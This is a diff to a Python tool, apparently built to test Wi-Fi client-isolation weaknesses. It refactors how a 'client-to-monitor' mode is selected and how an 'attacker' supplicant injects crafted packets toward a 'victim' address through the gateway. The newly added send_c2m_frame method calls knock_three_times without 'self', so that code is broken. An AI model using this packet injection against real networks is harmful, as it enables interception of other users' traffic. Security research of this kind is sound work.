@@ -168,7 +168,7 @@ class Monitor(Daemon):
 		subprocess.Popen(cmd1)
 		subprocess.Popen(cmd2)
 		subprocess.Popen(cmd3)
-		
+
 		super().stop()
 
 	def event_loop(self, condition=lambda: False, timeout=2**32):
@@ -1035,7 +1035,7 @@ class Client2Client:
 
 class Client2Monitor:
 	def __init__(self, options):
-		self.monitor = Monitor(options.c2m_ip, options)
+		self.monitor = Monitor(options.c2m, options)
 		self.sup_attacker = Supplicant(options.iface, options)
 		self.options = options
 
@@ -1043,6 +1043,10 @@ class Client2Monitor:
 		# self.sup_victim.stop()
 		self.monitor.stop()
 		self.sup_attacker.stop()
+
+	def send_c2m_frame(self):
+		if self.options.c2m_ip is not None:
+			knock_three_times()
 
 	def knock_three_times(self):
 		ip = IP(src=self.sup_attacker.clientip, dst="172.16.0.4")/UDP(sport=53, dport=53)
@@ -1054,15 +1058,13 @@ class Client2Monitor:
 		log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p3)} (Ethernet destination is the gateway/router)")
 		self.sup_attacker.send_eth(p1)
 		time.sleep(0.2)
-		#self.monitor.event_loop(timeout=5)
 		self.sup_attacker.send_eth(p2)
 		time.sleep(0.5)
-		#self.monitor.event_loop(timeout=5)
 		self.sup_attacker.send_eth(p3)
 		time.sleep(0.7)
-		#self.monitor.event_loop(timeout=5)
 
 	def start_monitor(self):
+		log(STATUS, "Starting Monitor!")
 		self.monitor.event_loop(timeout=5)
 
 	def run(self):
@@ -1148,6 +1150,8 @@ def main():
 	if options.c2c_port_steal_uplink is not None: options.c2c = options.c2c_port_steal_uplink
 	if options.c2c_gtk_inject is not None: options.c2c = options.c2c_gtk_inject
 
+	if options.c2m_ip is not None: options.c2m = options.c2m_ip
+
 	options.port = 443
 	if ":" in options.server:
 		options.server, options.port = options.server.split(":")
@@ -1155,7 +1159,7 @@ def main():
 
 	change_log_level(-options.debug)
 
-	if options.c2m_ip:
+	if options.c2m:
 		test = Client2Monitor(options)
 	elif not options.c2c:
 		test = Supplicant(options.iface, options)
